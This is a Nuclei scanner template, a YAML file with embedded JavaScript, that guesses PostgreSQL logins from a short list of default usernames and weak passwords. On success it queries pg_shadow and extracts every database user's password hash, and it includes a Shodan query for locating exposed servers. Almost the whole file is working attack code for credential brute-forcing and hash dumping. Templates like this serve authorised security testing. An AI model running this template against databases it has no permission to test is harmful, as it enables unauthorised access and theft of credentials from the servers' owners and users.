id: pgsql-list-password-hashes
info:
  author: pussycat0x
  description: 'Dump password hashes in use within a PostgreSQL database.

    '
  metadata:
    shodan-query: product:"PostgreSQL"
    verified: true
  name: PostgreSQL List Password Hashes
  reference:
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-password-hashes
  - https://launchbylunch.com/posts/2024/Jan/16/postgres-password-encryption/#postgresql-password-encryption-scram-sha-256
  - https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/postgres/postgres_hashdump.md
  severity: high
  tags: js,network,postgresql,authenticated
javascript:
- args:
    Db: '{{database}}'
    Host: '{{Host}}'
    Pass: '{{password}}'
    Port: 5432
    User: '{{usernames}}'
  attack: clusterbomb
  code: 'const postgres = require(''nuclei/postgres'');

    const client = new postgres.PGClient;

    connected =  client.ExecuteQuery(Host, Port, User, Pass, Db, "SELECT usename,
    passwd FROM pg_shadow");

    Export(connected)

    '
  extractors:
  - json:
    - '.Rows[] | "\(.usename) : \(.passwd)"'
    type: json
  payloads:
    database:
    - postgres
    password:
    - postgres
    - null
    - 123
    - amber
    usernames:
    - postgres
    - admin
